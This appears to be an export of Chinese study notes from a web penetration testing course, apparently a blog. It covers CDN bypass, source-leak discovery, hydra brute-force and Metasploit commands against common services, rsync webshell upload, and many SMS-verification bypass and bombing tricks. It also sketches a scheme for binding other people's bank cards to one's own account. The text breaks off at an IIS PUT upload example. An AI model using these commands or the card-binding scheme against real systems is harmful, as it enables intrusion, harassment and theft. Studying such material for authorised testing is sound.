[{"title":"02http数据包&抓包封包协议&资产架构&阻碍","url":"/2024/02/24/02http%E6%95%B0%E6%8D%AE%E5%8C%85-%E6%8A%93%E5%8C%85%E5%B0%81%E5%8C%85%E5%8D%8F%E8%AE%AE-%E8%B5%84%E4%BA%A7%E6%9E%B6%E6%9E%84-%E9%98%BB%E7%A2%8D/","content":" web请求返回过程数据包\nhttps://www.jianshu.com/p/558455228c43\nhttps://www.cnblogs.com/cherrycui/p/10815465.html\n 抓包封包协议\n\n科来网络分析系统\n\nAPP&amp;小程序&amp;PC抓包HTTP/S数据→Charles&amp;Fiddler&amp;Burpsuite\n程序进程&amp;网络接口&amp;其他协议抓包→Wireshark&amp;科来网络分析系统|tcpdump（Linux）\n通讯类应用封包分析发送接收→WPE四件套封包&amp;科来网络分析系统\n\n工具相关证书安装：\n\n夜神模拟器安装Burp Suite证书\n模拟器上下载Fiddler证书\nCharles证书安装（手机模拟器）\n\n推个雷电/逍遥模拟器\nburpsuite抓不到vx小程序\n\n存疑？\n\n\n\n封包和抓包不同之处？\n零散整体的区别，封包能精确到每个操作的数据包\n\n 资产架构&amp;阻碍\n\n资产架构\n\nWEB单个源码指向安全\nWEB多个目录源码安全\nWEB多个端口源码安全\n服务器假设多个站点安全\n架设第三方插件接口安全\n服务器假设多个应用安全\n\n阻碍\n\n站库分离\nCDN加速服务\n\nCDN：内容分发网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的响应速度。\n\n负载均衡服务\nWAF应用防火墙\n主机防护防火墙\n","tags":["小迪"]},{"title":"04CDN绕过","url":"/2024/03/10/04CDN%E7%BB%95%E8%BF%87/","content":" CDN绕过\nCDN知识-工作原理及阻碍CDN配置-域名&amp;区域&amp;类型CDN绕过-靠谱十余种技战法CDN绑定-HOSTS绑定指向访问\n 前置知识\n全称Content Delivery Network，即内容分发网络。\n使用户可就近取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的响应速度。\n关键技术主要有内容存储和分发技术\n传统访问：用户访问域名→解析服务器IP→访问目标主机\n普通CDN：用户访问域名→CDN节点→真实服务器IP→访问目标主机\n带WAF的CDN：用户访问域名→CDN节点（WAF）→真实服务器IP→访问目标主机\n\n判定标准：nslookup、各地ping\n 绕过\n 漏洞&amp;遗留文件\n\n\nphpinfo.php探针\n其中_SERVER[“SERVER_ADDR”]有主机信息\n（服务器有多个网卡，获取到的可能是内网IP地址）\n\n\nSSRF漏洞（不止这个漏洞）\n服务器IP地址1开启web服务来记录日志\n网址1有一个SSRF漏洞（会接受用户的数据并利用服务器去请求）\n漏洞去请求地址1\n日志就会记录访问的IP→相当于访问的服务器IP，得到真实IP\n\nping或请求网站时，自己请求的，所以访问的是CDN节点（正向）\n对方自己的服务器去请求设置的资源，所以是真实IP（反向）\n\n只要漏洞有带有让服务器去请求你设置的资源，就满足条件（XXE、命令执行反弹shell等）\n\n\n历史DNS记录\nhttps://dnsdb.io/zh-cn/https://x.threatbook.cn/http://toolbar.netcraft.com/site_report?url=http://viewdns.info/http://www.17ce.com/https://community.riskiq.com/http://www.crimeflare.com/cfssl.html\n\n\n 子域名查询操作\n可能会加速www但未加速其他子域名\nOneForAll子域名挖掘\nsubDomainsBrute\nSublist3r\n 接口查询国外访问\n小众国家可能不会设置对应的CDN\n国外CDN测试\n查找网站ip（可以互相验证，不一定确定对）\n 主动邮件配合备案\n邮件主动发给你（反向）\n邮件-显示原文-“Received: from”\n 全网扫描FuckCDN\nFuckCDN\n\n找到真实ip后hosts绑定真实ip，后续安全测试即可全部指向真实ip\n&#123;示例ip&#125; &#123;对应域名&#125;\n\n\nWindows：C:\\Windows\\System32\\drivers\\etc\\hosts\nLinux：/etc/hosts\n\n\n通过信息收集，缩小扫描范围，确定一个相对小的IP和端口范围（中国？AS号？B段？等）\n通过http指纹特征和keyword等做综合判断。可使用工具如下：\nhttps://github.com/zmap/zgrab/http://www.ipdeny.com/ipblocks/\n\n\nzgrab是基于zmap无状态扫描的应用层扫描器,可以自定义数据包，以及ip、domain之间的关联。可用于快速指纹识别爆破等场景。\n利用Zgrab绕CDN找真实IP - Levy Hsu\n\n\nZmap大法\n简单获取CDN背后网站的真实IP - 安全客 - 有思想的安全新媒体\n\n\n 查询Https证书\nhttps://censys.io/\n这个网址会将互联网所有的ip进行扫面和连接，以及证书探测。若目标站点有https证书，并且默认虚拟主机配了https证书，我们就可以找所有目标站点是该https证书的站点。\n443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:www.xxx.com\n","tags":["小迪"]},{"title":"03信息打点","url":"/2024/03/01/03%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9/","content":" 信息打点\n#知识点1.打点-Web架构-语言&amp;中间件&amp;数据库&amp;系统等2.打点-Web源码-CMS开元&amp;闭源售卖&amp;自主研发等打点-Web源码获取-泄露安全&amp;资源监控&amp;其他等打点-Web域名-子域名&amp;相似域名&amp;反查域名&amp;旁注等#信息点基础信息，系统信息，应用信息，防护信息，人员信息，其他信息等#技术点CMS识别，端口扫描，CDN绕过，源码获取，子域名查询，WAF识别，负载均衡识别等\n\n判断系统：\n\n\n更改大小写，访问正常可能为Windows；访问不一样可能为Linux（判定结果不一定百分百正确）\n不要在参数后面加（？后的），要在文件上加（例如：index.phP）不实用\n\n\nTTL值判定主机的操作系统\n\n\n\n\n\n操作系统\nTTL\n\n\n\n\nWindows NT/2000\n128\n\n\nWindows 95/98\n32\n\n\nUnix\n255\n\n\nLinux\n64\n\n\nWindows 7\n64\n\n\n\n但是当用户修改了TTL值的时候，就会误导我们的判断\n\n修改本机电脑上面的默认TTL值\nTTL值在注册表的位置是：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\n其中有个DefaultTTL的DWORD值，其数据就是默认的TTL值了，我们可以修改DefaultTTL里面的TTL默认值，但不能大于十进制的255。\n\n\n 信息搜集\n\n\n开发注释\n\n\n无法查看源代码（禁用JS或者Ctrl+U或者在网页url前面加view-source:）\n\n\n抓包、看包\n\n\nrobots协议：/robots.txt\nRobots协议（也称爬虫协议，机器人协议等）的全称是“网络爬虫排除协议”，网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。\n\n\nphps源码：/index.phps\nphps文件就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。\n因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。\n\n\n源码泄露：/www.zip     /www.tar.gz\n\n\nGit源码泄露：/.git/index.php     /.git/index\n漏洞利用工具：GitHack\ngithub项目地址：https://github.com/lijiejie/GitHack\n用法示例：\nGitHack.py http://www.openssl.org/.git/\n修复建议：删除.git目录或者修改中间件配置进行对.git隐藏文件夹的访问。\n\n\nSVN泄露：/.svn/entries\n使用svn checkout后，项目目录下会生成隐藏的.svn文件夹（Linux上用ls命令看不到，要用ls -al命令）。\nsvn1.6及以前版本会在项目的每个文件夹下都生成一个.svn文件夹，里面包含了所有文件的备份\nsvn1.7及以后版本则只在项目根目录生成一个.svn文件夹，里面的pristine文件夹里包含了整个项目的所有文件备份\ngithub项目地址：https://github.com/callmefeifei/SvnHack\nhttps://github.com/admintony/svnExploit\n\n\n备份文件：\n\n\n/index.php.swpb\n\n\n/index.php.bak\n\n\n/backup.sql\n\n\n.old\n\n\n.temp\n\n\nvim中的swp即swap文件，在编辑文件时产生，它是隐藏文件。这个文件是一个临时交换文件，用来备份缓冲区中的内容。如果原文件名是data，那么swp文件名就是.data.swp。如果文件正常退出，则此文件自动删除。需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生swp文件的。\n漏洞利用：直接访问.swp文件，下载回来后删掉末尾的.swp，获得源码文件。\n\n\ncookie泄露\n\n\n域名解析\nA 记录：\n最基本的记录类型，也称为地址记录，为域名或子域名提供 IPv4 地址。该记录将域名指向 IP 地址。\nAAAA 记录：\n将主机名映射到 128 位 IPv6 地址。长期以来，32位IPv4地址用于识别互联网上的计算机。但由于IPv4的短缺，IPv6被创建。四个“A”（AAAA）是助记符，表示IPv6比IPv4大四倍。\nCNAME 记录：\n也称为规范名称记录，创建一个域名的别名。别名域或子域获取原始域的所有 DNS 记录，通常用于将子域与现有主域相关联。\nMX 记录：\n也称为邮件交换记录，告知哪些邮件交换服务器负责将电子邮件路由到正确的目标或邮件服务器。\nNS 记录：\n也称为名称服务器记录，指向有权管理和发布该域的 DNS 记录的名称服务器。这些 DNS 服务器在处理与该域相关的任何查询方面具有权威性。\nPTR 记录：\n也称为指针记录，将 IPv4 或 IPv6 地址指向其计算机的主机名。它通过将 IP 地址指向服务器的主机名来提供反向 DNS 记录或 rDNS 记录。\nSRV 记录：\n也称为服务记录，指示域运行的特定服务和端口号。可扩展消息传递和状态协议 （XMPP） 和会话初始协议 （SIP） 等互联网协议通常需要 SRV 记录。\nSOA 记录：\n也称为授权机构起始记录，提供有关域的基本信息，例如标识域权威名称服务器的主节点、域管理员的电子邮件、DNS 区域的序列号等。\nTXT 记录：\n允许网站管理员在 DNS 记录中插入任意文本。\nCAA 记录：\n也称为证书颁发机构授权记录，反映了有关为域颁发数字证书的公共策略。如果您的域不存在 CAA 记录，则任何证书颁发机构都可以颁发 SSL 证书。但是，使用此记录，您可以限制哪个 CA 有权为您的域颁发数字凭据。\nDS 记录：\n也称为委派签名者记录，由公钥的唯一字符及其相关元数据（如密钥标记、算法、摘要类型和称为摘要的加密哈希值）组成。\nDNSKEY 记录：\n也称为 DNS 密钥记录，包含公共签名密钥，如区域签名密钥 （ZSK） 和密钥签名密钥 （KSK）。DS 和 DNSKEY 记录验证 DNS 服务器返回的 DNS 记录的真实性。\n\n\n有的会有技术文档泄露信息\n\n\nphp探针：/tz.php\n\n\nmdb文件：/db/db.mdb\nmdb文件是早期asp+access架构的数据库文件 直接查看url路径添加/db/db.mdb下载文件\n\n\nJava源码泄露：WEB-INF/web.xml和/WEB-INF/classes/泄露\nWEB-INF是Java的WEB应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。\nWEB-INF 主要包含一下文件或目录：\nWEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)，放置仅在这个应用中要求使用的jar文件，如数据库驱动jar文件WEB-INF/src/ : 用来放源代码(.asp和.php等)\n通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。\n\n\n御剑扫目录\n\n\nDS_Store文件泄露\n.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_Store上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。\n漏洞利用工具：\ngithub项目地址：https://github.com/lijiejie/ds_store_exp\n用法示例：\nds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store\n\n\nGitHub源码泄露\nhttps://github.com/search?q=smtp+user+@qq.com&amp;type=code\n\n\nComposer.json泄露\n（PHP特性）\n\n\nhg源码泄露\nMercurial 是一种轻量级分布式版本控制系统，使用 hg init的时候会生成.hg。\n漏洞利用工具：dvcs-ripper\ngithub项目地址：https://github.com/kost/dvcs-ripper\n用法示例：\nrip-hg.pl -v -u http://www.example.com/.hg/\n\n\nCVS泄露\nCVS是一个C/S系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息。\nhttp://url/CVS/Root 返回根信息http://url/CVS/Entries 返回所有文件的结构\n漏洞利用工具：dvcs-ripper\ngithub项目地址：https://github.com/kost/dvcs-ripper.git\n运行示例：\nrip-cvs.pl -v -u http://www.example.com/CVS/\n\n\nBazaar/bzr泄露\nbzr也是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面。\n运行示例：\nrip-bzr.pl -v -u http://www.example.com/.bzr/\n\n\n 端口\n常见的端口以及入侵方式\n\n 攻击方向\n 21(FTP)\n默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）\n爆破：\n#anonymous匿名登陆#弱口令 用户名：FTP 密码：FTP或为空或爆破hydra -l FTP -P top10000.txt ftp://192.168.115.136\n嗅探：\nEttercap(内网神器)\nSRE实战 互联网时代守护先锋，助力企业售后服务体系运筹帷幄！一键直达领取阿里云限量特价优惠。\n或msf模块\nuse auxiliary/sniffer/psnuffle\n后门：\n在特定版本的vsftpd服务器中，被人恶意植入代码，当用户名以”😃”为结尾\n服务器就会在6200端口监听，并且能够执行任意代码(root)\nuse exploit/unix/ftp/vsftpd_234_backdoor\n 22(SSH)\n爆破：\n#可以采用上边那种或以下这种写法hydra -l root -P top10000.txt 192.168.115.136 ssh -v \n 53(DNS)\n内网使用Ettercap进行DNS劫持，钓鱼攻击\n公网的话要能控制运营商网关\n 139(Smb)\n爆破：\nhydra -l root -P top10000.txt 192.168.115.136 smb -v\n远程代码执行：\nCVE-2015-0240\nCVE-2017-7494\n 443(https)\n检测：\n心脏滴血在线检测\nnmap -sV -p 8443 --script ssl-heartbleed 192.168.115.136\n利用：\nuse auxiliary/scanner/ssl/openssl_heartbleed\n 873(Rsync)\n未授权访问：\nrsync -avz ip::wwwroot/目录   /root/ #下载目标主机上的文件到本机root目录rsync -avz shell.php 192.168.3.xxx::wwwroot #上传文件\n 2049(NFS)\n未授权访问\n列出导出文件夹：\nuse auxiliary/scanner/nfs/nfsmount\n 6379(Redis)\n未授权访问：\n#没有密码，直接连接redis-cli -h 192.168.115.136#Redis命令&gt;info #查看主机信息\nRedis未授权访问总结(1)\nRedis未授权访问总结(2)\n 7001/7002(weblogic)\n反序列化：CVE-2017-3248\n WAF识别\n本文转载自微信公众号：**潇湘信安。**已获得原作者授权，转载请注明出处\n原文链接：https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ\nWAF识别工具WAFW00F\nWAF识别工具IDENTYWAF\n D盾\n\n 云锁\nWAF\n\n云锁防火墙\n\n UPUPW安全防护\n\n 宝塔网站防火墙\n\n 网防G01\n\n 护卫神\n\n 网站安全狗\n\n 智创防火墙\n\n 360主机卫士或360webscan\n\n 西数WTS-WAF\n\n Naxsi WAF\n\n 腾讯云\n\n 腾讯宙斯盾\n\n 百度云\n\n 华为云\n\n 网宿云\n\n 创宇盾\n\n 玄武盾\n\n\n 阿里云盾\n\n 360网站卫士\n\n 奇安信网站卫士\n\n 安域云WAF\n\n 铱讯WAF\n\n 长亭SafeLine\n\n 长亭雷池\n\n 安恒明御WAF\n\n F5 BIG-IP\n\n\n\n Mod_Security\n\n OpenRASP\n\n dotDefender\n\n 红网云WAF\n\n 云网盾\n\n 负载均衡识别\n分为两大类：\n\n广域网负载均衡\n他的原理就是DNS，简单的方法就是使用DNS轮询来进行负载均衡。当你访问一个域名时，同一个域名会被解析成多个A记录解析到多个ip地址上。\n服务器负载均衡\n基于web的服务，经常使用的是nginx、apache这种应用层的负载均衡。\n当然也可以使用一些负载均衡设备去实现。\n\n识别工具：kali上的ldb\nldb www.baidu.com\n==※==基本上大站去扫描的话，他们要么是广域网的要么是服务器的负载均衡，即使扫描到同一个域名只解析到一个ip地址，这个地址对应的设备也基本是负载均衡设备，而不是他真实的服务器\n 防火墙识别\nnmap\naFa攻防实验室防火墙识别（用处不大）\n APP&amp;小程序\n\nAppInfoScanner：内在提取资产\n资源提取：比如涉及到的图片、配置性文件\nXposed&amp;JustTrustMe：解决加壳、有检测的防抓包、防调试的APP上的数据抓取\n\n 小程序源码获取\n目录↓\n/data/data/com.tencent.mm/MicroMsg/&#123;&#123;一串32位的16进制字符串名文件夹&#125;&#125;/appbrand/pkg/\n有xxxxx.wxapkg类型的文件\n\n想要进入到上面这个目录，需要使用到第三方的文件管理器，且安卓需要取得root权限\n\n\nGitHub项目：wxappUnpacker\n进入脚本目录后\nnpm install esprimanpm install css-treenpm install cssbeautifynpm install vm2npm install uglify-esnpm install js-beautify\nnode wuWxapkg.js [-d] &lt;files...&gt;    //files 就是你想要反编译的文件名，注意路径是反斜杠\\\n在微信开发者工具新增项目即可打开\n\n如果运行出现了点问题，可以试试点击开发者工具 详情 去掉 es6转es5 的勾，勾上不校验安全域名\n勾选了还是无法运行？那么请在详情里把基础版本库调低至1.8左右，再试试\n出现找不到某些文件的情况怎么办？我只能告诉：删！删！删！app.json里面,提示找不到那个文件，就将pages下注册的该页面语句暂时删除掉。删到可以运行为止\n\n","tags":["小迪"]},{"title":"05PHP个人博客","url":"/2024/03/17/05PHP%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","content":" 文件操作&amp;上传&amp;下载&amp;删除&amp;读取&amp;写入等\n\n文件上传类：任意文件上传\n\n\n代码自主编写\n编辑器引用\n\n\n文件下载类：任意文件下载\n\n\n直连URL访问\n传参头部修改\n\n\n文件删除类：任意文件删除\n\n\n文件删除\n文件夹删除\n\n\n文件内容操作类：任意文件读取&amp;写入\n\n\n文件读取\n文件写入\n\n\n文件包含——任意文件包含\n\n\n本地文件包含\n远程文件包含\n\n\nWeb漏洞核心\n\n\n可控变量\n特定函数\n\n站在开发角度看问题→漏洞\n 输入输出类&amp;留言板&amp;访问IP&amp;UA头来源\n\nPHP-全局变量$_SERVER\nMySQL-插入语法INSERT\n输入输出-XSS&amp;反射&amp;存储\n安全问题-XSS跨站&amp;CSRF等\n\n 通过userAgent判断设备信息 userAgent常用大全\nconst ua = window.navigator.userAgent || window.navigator.vendor || window.opera// 是否为智能设备export const IS_SMART_DEVICE = (/iPhone|iPod|iPad|Silk|Android|BlackBerry|Opera Mini|IEMobile/).test(ua)// 是否为 IOS 浏览器export const IS_IOS_BROWSER = (/iPhone|iPod|iPad/).test(ua)// 是否为 Android 浏览器export const IS_ANDROID_BROWSER = (/Android/).test(ua)// PC浏览器, 非智能设备export const IS_NOT_SMART_DEVICE = !IS_SMART_DEVICE// 微信内export const IS_WECHAT_APP = (/MicroMessenger/).test(ua)// APP 内置浏览器  这个是我们跟客服端定义的一个字段 因为有些页面要作为webview嵌套  客户端那边可以在userAgent后面添加参数 可扩展性比较高 也可以加上当前APP版本号export const IS_APP_WEBVIEW = (/Enjoyrv/).test(ua)// iPhone 内置浏览器export const IS_IOS_APP = IS_APP_WEBVIEW &amp;&amp; (/iPhone|iPod|iPad/).test(ua)// Android 内置浏览器export const IS_ANDROID_APP = IS_APP_WEBVIEW &amp;&amp; (/Android/).test(ua) &amp;&amp; (/Enjoyrv/).test(ua)// 智能设备, 但非APP内置浏览器export const IS_SMART_DEVICE_BROWSER_ONLY = IS_SMART_DEVICE &amp;&amp; !IS_APP_WEBVIEW// 访问设备来源export const getDeviceType = function () &#123;  if (IS_IOS_APP) &#123;    return &#x27;APP_IOS&#x27;  &#125;  if (IS_ANDROID_APP) &#123;    return &#x27;APP_ANDROID&#x27;  &#125;  if (IS_WECHAT_APP &amp;&amp; IS_ANDROID_BROWSER) &#123;    return &#x27;WECHAT_APP_ANDROID&#x27;  &#125;  if (IS_WECHAT_APP &amp;&amp; IS_IOS_BROWSER) &#123;    return &#x27;WECHAT_APP_IOS&#x27;  &#125;  if (IS_NOT_SMART_DEVICE) &#123;    return &#x27;PC_BROWSER&#x27;  &#125;  if (IS_IOS_BROWSER) &#123;    return &#x27;IOS_BROWSER&#x27;  &#125;  if (IS_ANDROID_BROWSER) &#123;    return &#x27;ANDROID_BROWSER&#x27;  &#125;  if (IS_SMART_DEVICE) &#123;    return &#x27;UNKNOWN_SMART_DEVICE&#x27;  &#125;  return &#x27;&#x27;&#125;\n 登录验证&amp;Cookie&amp;Session&amp;验证码安全\n\nCookie：存储到客户端浏览器内\n\nCookie修改、伪造、盗取\n\nSession：存储到服务端服务器内\n\n会话劫持（Session劫持）\n 验证码\n\n验证码可爆破\n\n对于验证码位数4-6且没有次数限制和时间限制，或者时间过程我们均可进行验证码的爆破\n\n爆破后根据长度回显来判断哪一个验证码是正确的\n\n验证码回显\n\n验证码存在于请求包或响应包里\n\n\n验证码复用\n\n使用的验证码没有进行销毁处理，能够一直使用\n\nburp右键发送到repeater模块，两次点击go观察返回包若回显信息一样则证明可复用\n从安全角度讲，每次登录验证码都要变\n\n每次登录验证码都变化的情况可以使用验证码识别插件\n\n可以写在一些安全的修复方法上，这也是能够得到一定的认可的\n\n验证码可控\n\n验证长度或内容可以被我们进行修改\n\nphone=18888888888&amp;code=6phone=18888888888&amp;code=zyzm\n例如上图抓包前面是电话号码，后面code=6，将6改为4，我们可以收到4位数验证码\n或此处就是它的验证码，可以将这里进行修改，修改为别的接着发送，我们就能收到什么样的验证码\n\n修改返回包\n\n验证只在本地验证，通过修改返回包进行绕过\n\nfalse改为success、true，400改为200，0改为1或-1\n\n双写导致验证码转发\n\n加个逗号后面接上需要转发的手机号，因为开发可能使用数组就导致同时把验证码发给两个手机号\nmobi=18888888888,17777777777mobi=18888888888&amp;mobi=17777777777\n\n随意验证码\n\n填写任意满足位数需求的验证码都能完成登录\n原因：有验证码功能模块，但验证模块与业务功能没有什么关联性，即无论输入什么或者不输入验证码都判断验证码安全\n\n万能验证码\n\n由于开发的失误，上线测试时设置了万能验证码方便登录调试，但上线后却没有进行删除导致万能验证码的存在\n\n验证码可以使用0000/8888/000000/888888等一系列便于记忆的相同数字进行尝试\n\n验证码为空\n\n将验证码字段修改为空或者null，即可进行绕过\nmobil=18888888888&amp;code=mobil=18888888888&amp;code=nullmobil=18888888888&amp;code=truemobil=18888888888&amp;code=1\n\n绑定关系存在缺陷\n\n只验证了验证码，没有做账号绑定\n\nmobil=18888888888  收到验证码mobil=19999999999  收到验证码123456mobil=18888888888&amp;code=123456\n\n特殊字符绕过\n\n手机号码前后加空格，86，086，0086，+86，0，00，/r，/n以及特殊符号等\n或者在手机号码最后多添加一位数字，因为12位经过短信网关取前11位，导致短信轰炸\nmobi=8618888888888mobi= 18888888888 mobi=0018888888888mobi=/r18888888888\n\n特殊的绕过点\n\n有些验证码是通过cookie中的PHPSESSID来判断的\n修改PHPSESSID，成功绕过了验证码限制\n\n此处说验证码必须存在，但是修改PHPSESSID后\n\n可绕过验证码的判定，从而实现账号密码的枚举\n\nip的伪造绕过\n\n程序只对访问者的错误次数与ip进行绑定，通过XXF伪造ip从而进行绕过限制\nX-Forwarded-For:127.0.0.1X-Remote-IP:127.0.0.1X-Client-IP:127.0.0.1X-Real-IP:127.0.0.1Client-IP:127.0.0.1X-Originating-IP:127.0.0.1X-Remote-Addr；127.0.0.1 \n\n删除Cookie绕过\n\n虽然有验证码，但是只要抓包后把Cookie去掉即可，之后就再也没有验证码提示\n\n\n并发验证码\n\n通过并发验证码请求数据包，导致可以短时间内收到大量短信，从而实现短信轰炸\n\n验证码DOS\n\n原理：图形验证码的生成大多都基于复杂的图像生成算法，本来就很消耗CPU、GPU性能，此时攻击者再把尺寸增大，就会成倍消耗性能，如果大到一定程度再结合高并发，服务器很有可能瞬间崩溃，也就造成了DOS攻击，修改数据包验证码的长宽，如果响应字节变大则存在该漏洞\n接口：https://www.xxx.com/xxx?width=162&amp;height=162\n如果没有参数可以自己添加尝试\nheight=1111h=1111size=1111margin=1111\n\n不仅仅是验证码可以出现，该漏洞二维码也是可以的\n\n\n\n\n时间戳绕过\n\n很多发送验证码的时候都会出现类似time参数，对于这类参数大多都是使用时间戳来验证，只需将时间提前即可绕过，比如抓到的包时间是08:09，直接改为08:20，它会比时间戳多出一两个数字\n时间戳在线转换地址\n\n\n验证码前端验证\n\n验证码的检测是由前端进行的，可以通过禁用js的方式从而实现绕过\n验证码由客户端js生成并且仅仅在客户端用js验证，通过抓包看是否有验证码字段，或者是关闭js看能否通过验证\n\n验证码后端验证\n\n端验证码是由后端生成的验证码。当用户打开登录页面后，浏览器会向服务器发送请求并携带生成的令牌token，服务器随机生成验证码并将验证码和token对应关系存储在Redis缓存中，之后会在前端动态的生成一张验证码图片。当用户输入验证码并点击登录的时候，服务器会在Redis缓存中找到该浏览器的token对应的验证码，验证验证码是否正确，如果正确，接下来开始比较用户名和密码\n\n可看到回显数据包中也有一个336\n\n比如这是第一次验证码的返回包是336，下次验证码请求时336仍会出现在这里。所以只需要获取上一次验证码的值，然后拼接在这一次的值中可实现账号密码的爆破\n\n语音轰炸\n\n通过不断重放数据包或并发该数据包，从而实现语音轰炸\n\n 补充\n并发轰炸：同时并发数据包，若存在限制，留意返回时间，采用单线程，调节间断时间，并发发包\n存在检测：若网页存在检测无法抓包，可以换手机抓包进行绕过，接着将数据包发送给电脑进行测试\n邮箱绕过：比如email=xxx@qq.com，当次数达到限制时，将字母修改为大写：email=XXX@Qq.com，即可绕过\n思路拓展：任意盗刷别人银行卡\n仅在绑卡时知道卡号，然后把手机号替换成自己的号码去接收验证码，再去绑定别人的卡，小额致富不需要知道银行卡密码，只需要自己设置的密码就行（参考vx支付的时候使用银行卡）\n\n抓包替换手机号1.银行卡=123456&amp;手机号=123****45672.银行卡=123456&amp;手机号=12345678910抓包替换银行卡1.银行卡=123456&amp;手机号=123****45671.银行卡=789987&amp;手机号=123****4567\n拓展情境：\n\n输入卡号后会显示预留的电话号码，让输入正确的电话号码后同意协议并验证，此时输入任意一个号码，会提示号码前三位和后四位，爆破中间的四位，成功后可让别人的银行卡绑定在自己的账号上面\n JS-Ajax&amp;前端逻辑&amp;购物&amp;登录&amp;上传\n\nJS前端验证-文件上传\nJS-Ajax传递-登录-状态\nJS-Ajax传递-购物-参数\n\n TP框架&amp;路由访问&amp;安全写法&amp;历史漏洞\n\n框架\n\nThinkPHP\nLaravel\nyii\n\n\n\n ThinkPHP-URL访问形式与对应文件\n首页会指向application/index/controller/Index.php\nThinkPHP5.0典型URL访问规则是\nhttp://127.0.0.1/index.php(或者其他应用入口文件)/模块/控制器/操作/[参数名/\nStruggle.php(.\\application\\index\\controller)&lt;?phpnamespace app\\index\\controller;use think\\Controller;use think\\Db;class Struggle extends Controller&#123;    public function x()&#123;        echo &quot;成功访问Struggle！&quot;;    &#125;&#125;\n1.http://127.0.0.1/index.php/index/struggle/x2.http://127.0.0.1/index.php?s=index/struggle/x3.http://127.0.0.1/index.php/index/struggle/x.html(具体要看配置)4.http://127.0.0.1/index.php?m=index&amp;c=index&amp;a=index(3.x的写法)(MVC开发：m代表model，v代表view，c代表controller，a代表方法名)---成功访问Struggle！\n\nStruggle.php(.\\application\\index\\controller)&lt;?phpnamespace app\\index\\controller;use think\\Controller;use think\\Db;class Struggle extends Controller&#123;    public function x()&#123;        echo &quot;成功访问Struggle！&quot;;    &#125;    public function y()&#123;        //1        $x=$_GET[&#x27;x&#x27;];        echo $x;        //2        $x=input(&#x27;x&#x27;);        echo $x;    &#125;&#125;\n1:http://127.0.0.1/index.php/index/struggle/y?x=12:http://127.0.0.1/index.php/index/struggle/y/x/1\napplication中创建yes文件夹，复制application的index中的public到yes\nLove.php(.\\application\\yes\\controller)&lt;?phpnamespace app\\yes\\controller;use think\\Controller;use think\\Db;class Love extends Controller&#123;    public function x()&#123;        echo &quot;成功访问Struggle！&quot;;    &#125;    public function xxx()&#123;        $x=input(&#x27;x&#x27;);        echo $x;    &#125;&#125;\nhttp://127.0.0.1/index.php/yes/love/xxx?x=1\n\nThinkPHP5配置文件\n\n.\\application\\config.php.\\application\\database.php.\\thinkphp\\tpl\\base.php//看TP版本\n\n实例\n\nAdminLTE后台管理系统\nlayui后台管理系统\nthinkcmf\nH-ui.admin后台管理系统\ntpshop\nFastAdmin\neyoucms\nLarryCMS后台管理系统\ntpadmin后台管理系统\nsnake后台管理系统\nThinkSNS\nDolphinPHP后台管理系统\nThinkSNS\nDolphinPHP后台管理系统\nWeMall商城系统\nCLTPHP\n齐博CMS\nDSMALL\nYFCMF\nHisiPHP后台管理系统\nTplay后台管理系统\nlyadmin后台管理系统\nhaoid后台管理系统\n\n用的框架找漏洞\n\n看写法\n看历史漏洞\n\n\ngithub.com/Mochazz/ThinkPHP-VulnTP历史漏洞坤舆-seebug-thinkphp\n","tags":["小迪"]},{"title":"06Web攻防","url":"/2024/03/27/06Web%E6%94%BB%E9%98%B2/","content":" ASP\n\nASP环境搭建组合：Windows+IIS+ASP+Access（SQLserver）\n\nAccess数据库一般后缀名asp asa（前两个被解析）mdb（下载）\nmdb文件在网站目录下\n\n数据库配置：./database/***.mdb\n后台：./admin/admin_login.asp\n\n思路：如果知道数据库地址，可尝试获取数据库文件，获取当前管理员账号密码信息\n\n\nIIS-短文件&amp;解析&amp;写权限\n\n\nASP-中间件-IIS短文件名探针-安全漏洞\nIIS shortname Scanner\n\n\nASP-中间件-IIS文件上传解析-安全漏洞\n*.asp:.jpg*.asp/1.jpg(*.asp的目录里有1.jpg)下文具体解释\n\n\nASP-中间件-IIS配置目录读写-安全配置\n网站配置中勾选了写入，同时Web服务拓展中的WebDAV开启，此时出现写入漏洞\nIISPutScanner\n\n\n\n\n IIS6.0解析漏洞\n\n\nIIS版本\n\nWindows Server 2003→IIS 6.0\nWindows7→IIS7.0和IIS7.5\nWindows Server 2008 SP2→IIS7.0\nWindows Server 2008 R2→IIS7.5\nWindowsXP和Windows Server 2000→IIS5.0\n\n\n\n漏洞原理\n如上\n\n\n上传原理\nWebDAV基于HTTP1.1协议的通信协议使得HTTP支持PUT、MOVE、COPY和DELLTE方法\n验证：\n抓包时更改GET为OPTIONS，观察到返回包的Public里有多个方法，说明存在漏洞\n\n\n上传TXT文件\nPUT请求\n&lt;% eval 